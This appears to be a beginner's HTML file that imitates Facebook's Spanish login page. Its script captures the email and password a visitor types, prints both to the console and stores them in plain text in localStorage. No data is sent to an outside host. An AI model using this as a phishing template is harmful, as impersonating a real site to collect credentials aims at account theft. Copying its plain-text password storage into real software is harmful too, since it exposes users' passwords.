<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Página de Inicio de Sesión - Wainner</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="left-section">
            <h1 class="title">Facebook</h1>
            <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
        </div>
        <div class="right-section">
            <div class="login-box">
                <form id="loginForm">
                    <input type="text" id="email" name="email" placeholder="Correo electrónico o número de teléfono" required>
                    <input type="password" id="password" name="password" placeholder="Contraseña" required>
                    <button type="submit" class="login-button">Iniciar sesión</button>
                    <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
                    <hr>
                    <button class="create-account-button">Crear cuenta nueva</button>
                </form>
            </div>
        </div>
    </div>
    <footer>
        <p>Crea una página para una celebridad, una marca o un negocio.</p>
    </footer>

    <!-- Script para manejar localStorage -->
    <script>
        // Obtener el formulario
        const form = document.getElementById('loginForm');

        // Agregar un evento al formulario para manejar el envío
        form.addEventListener('submit', function(event) {
            event.preventDefault(); // Evita el envío del formulario por defecto

            // Obtener los valores de los campos del formulario
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Mostrar en la consola para verificar los valores
            console.log("Email:", email);
            console.log("Password:", password);

            // Guardar los valores en localStorage
            localStorage.setItem('email', email);
            localStorage.setItem('password', password);

            // Redirigir a la misma página (recargarla)
            window.location.reload();
        });

        // Comprobar si los datos se guardaron correctamente en localStorage
        console.log("Email en localStorage:", localStorage.getItem('email'));
        console.log("Password en localStorage:", localStorage.getItem('password'));
    </script>
</body>
</html>
